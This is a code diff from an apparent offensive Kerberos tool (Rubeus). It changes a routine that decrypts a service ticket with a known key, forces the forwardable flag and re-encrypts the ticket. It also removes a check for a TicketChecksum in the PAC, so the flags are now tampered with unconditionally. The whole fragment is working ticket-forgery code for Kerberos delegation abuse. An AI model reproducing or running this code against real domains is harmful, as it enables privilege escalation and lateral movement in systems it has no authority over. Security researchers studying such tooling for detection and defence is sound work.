@@ -501,28 +501,18 @@ namespace Rubeus
                     byte[] key = Helpers.StringToByteArray(keyString);
 
                     // decrypt and decode ticket encpart
-                    outBytes = Crypto.KerberosDecrypt(encType, Interop.KRB_KEY_USAGE_AS_REP_TGS_REP, key, rep.ticket.enc_part.cipher);
-                    ae = AsnElt.Decode(outBytes, false);
-                    EncTicketPart decTicketPart = new EncTicketPart(ae.Sub[0]);
+                    var decTicketPart = rep.ticket.Decrypt(key, null, true);
 
-                    // check if the TicketChecksum exists within the PAC
-                    if (decTicketPart.TicketChecksumExists())
-                    {
-                        // modify flags
-                        decTicketPart.flags |= Interop.TicketFlags.forwardable;
+                    // modify flags
+                    decTicketPart.flags |= Interop.TicketFlags.forwardable;
 
-                        // encode and encrypt ticket encpart
-                        byte[] encTicketData = decTicketPart.Encode().Encode();
-                        byte[] encTicketPart = Crypto.KerberosEncrypt(encType, Interop.KRB_KEY_USAGE_AS_REP_TGS_REP, key, encTicketData);
-                        rep.ticket.enc_part = new EncryptedData((Int32)encType, encTicketPart, rep.ticket.enc_part.kvno);
-                        Console.WriteLine("[*] Flags changed to: {0}", info.flags);
-                    }
-                    else
-                    {
-                        Console.WriteLine("[!] TicketChecksum is present, modifying ticket flags will not work.");
-                    }
+                    // encode and encrypt ticket encpart
+                    byte[] encTicketData = decTicketPart.Encode().Encode();
+                    byte[] encTicketPart = Crypto.KerberosEncrypt((Interop.KERB_ETYPE)rep.ticket.enc_part.etype, Interop.KRB_KEY_USAGE_AS_REP_TGS_REP, key, encTicketData);
+                    rep.ticket.enc_part = new EncryptedData(rep.ticket.enc_part.etype, encTicketPart, rep.ticket.enc_part.kvno);
+                    Console.WriteLine("[*] Flags changed to: {0}", info.flags);
                 }
-                
+
                 // add the ticket
                 cred.tickets.Add(rep.ticket);
 
